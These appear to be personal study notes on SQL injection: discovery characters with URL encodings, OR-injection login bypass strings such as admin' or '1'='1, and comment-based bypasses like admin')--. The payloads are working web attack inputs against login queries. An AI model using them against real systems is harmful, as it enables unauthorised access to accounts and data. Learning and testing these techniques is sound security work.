# Subverting Query Logic

## SQLI Discovery

Payloads to try to test for SQLI, we should check for errors or if the page changes it behavior:

| Payload | URL Encoded |
| --- | --- |
| `'` | `%27` |
| `"` |`%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

## Authentication Bypass

Example query when entering credentials:
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

### OR Injection

OR will be evaluated after AND so one true statement with OR will result in a true query.

An example of bypassing the above query, making sure it has even number of quotes:
```sql
admin' or '1'='1
```

![[or_inject_diagram.png]]

It works because the user admin exists, if we will try with a username that doesn't exist it wouldn't work, but we can inject something like `something' or '1'='1` to the password field.

# Using Comments

## Comments

There are 2 types of line comments, `--` and `#`, as well as in-line `/**/` comment which isn't typically used with SQLI.

Examples of using a comment:
```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

mysql> SELECT * FROM logins WHERE username = 'admin'; # When inputting # in URL within a browser you need to use the encoded version which is %23 so it wouldn't be considered a tag
```

You must put a space after `--` which is URL encoded as `+` we can add `-` at the end (`-- -`) to show the use of a space character.

The query can also look something like that with parenthesis:
![[paranthesis_fail.png]]

We can use `admin')--` to bypass this.